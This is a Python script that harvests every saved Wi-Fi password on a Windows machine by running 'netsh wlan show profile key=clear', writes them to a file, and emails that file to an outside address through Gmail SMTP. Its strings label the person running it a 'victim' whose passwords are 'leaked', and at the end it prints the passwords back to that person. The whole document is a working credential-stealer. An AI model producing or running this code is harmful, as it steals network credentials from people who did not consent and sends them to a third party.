from subprocess import check_output
from os import environ
from smtplib import SMTP_SSL
from email.message import EmailMessage
from datetime import datetime

victim_name = 'Lorem Ipsum'
timestamp = datetime.now().ctime()
RECEIVING_ADDRESS = environ.get(EMAIL_ADDRESS)

def createPasswordsFile(password_dict):
	with open('passwords.txt', 'w') as f:
		f.write(password_dict)

def email():
	EMAIL_ADDRESS = environ.get(EMAIL_ADDRESS)
	EMAIL_PASS = environ.get(EMAIL_PASS)

	message = EmailMessage()
	message['subject'] = f"{victim_name}'s Wifi Passwords - {timestamp}"
	message['From'] = EMAIL_ADDRESS
	message['To'] = RECEIVING_ADDRESS
	message.set_content(f"{victim_name}'s Wifi passwords have been leaked. Attached is the leaked data.")

	with open('passwords.txt', 'rb') as f:
		file_data = f.read()
		file_name = f.name

	message.add_attachment(file_data, maintype = 'application', subtype = 'octet-stream', filename = file_name)
	with SMTP_SSL('smtp.gmail.com', 465) as smtp:
		smtp.login(EMAIL_ADDRESS, EMAIL_PASS)

		smtp.send_message(message)

def getWifiPassword(wifi_name):
	try:
		output = check_output(['netsh','wlan','show','profile', wifi_name, 'key=clear']).decode('utf-8').split('\n')
		for i in output:
			if "Key Content" in i:
				return i.split(":")[1].strip()
	except:
		return 'Problem with finding password'

def getWifiDirectory():
	output = check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
	wifis = []
	for i in output:
		if "All User Profile" in i:
			wifis.append(i.split(":")[1].strip())

	return wifis

def generatePasswordDict():
	wifis = getWifiDirectory()
	pass_directory = {}
	for wifi in wifis:
		pass_directory[wifi] = getWifiPassword(wifi)

	return pass_directory

def prettifyDict(unpretty_dict, seperator_symbol = '>>>>'):
	keys = unpretty_dict.keys()
	longest_key = 0
	for key in keys:
		if len(str(key)) > longest_key:
			longest_key = len(str(key))

	pretty_dict = ''
	for key in keys:
		space_len = longest_key - len(str(key))
		pretty_dict += str(key) + (' ' * space_len) + seperator_symbol + ' ' + str(unpretty_dict[key]) + '\n'

	return pretty_dict

def addInformation(original_text, victim_name, timestamp):
	return f"{victim_name}'s Wifi Passwords:\n{timestamp}\n" + original_text

pass_dict = generatePasswordDict()

pretty_dict = prettifyDict(pass_dict)

pretty_dict_w_timestamp = addInformation(pretty_dict, victim_name, timestamp)

createPasswordsFile(pretty_dict_w_timestamp)

email()

print(pretty_dict)

input("Above are your passwords. Press enter to exit.")